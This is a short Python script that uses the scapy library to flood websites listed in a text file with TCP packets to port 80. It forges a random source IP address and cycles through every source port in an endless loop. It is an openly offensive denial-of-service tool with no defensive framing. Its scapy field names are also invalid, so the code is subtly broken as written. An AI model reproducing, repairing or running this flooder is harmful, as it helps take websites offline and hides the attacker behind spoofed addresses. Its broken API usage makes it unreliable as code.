import random
from scapy.all import *

i=1

while True:
    with open("WebsiteIPs.txt") as ips:
        websiteIPs = ips.readlines()
        octet1 = str(random.randint(1, 254))
        octet2 = str(random.randint(1, 254))
        octet3 = str(random.randint(1, 254))
        octet4 = str(random.randint(1, 254))
        dot = '.'

        source_IP = octet1 + dot + octet2 + dot + octet3 + dot + octet4
        for targetIp in websiteIPs:
            for portOut in range(1,65535):
                IP1 = IP(source_IP = source_IP, destination = targetIp)
                TCP1 = TCP(srcport = portOut, dstport = 80)
                pkt = IP1 / TCP1
                send(pkt,inter = .001)

                print ("packet sent ", i)
                i = i + 1
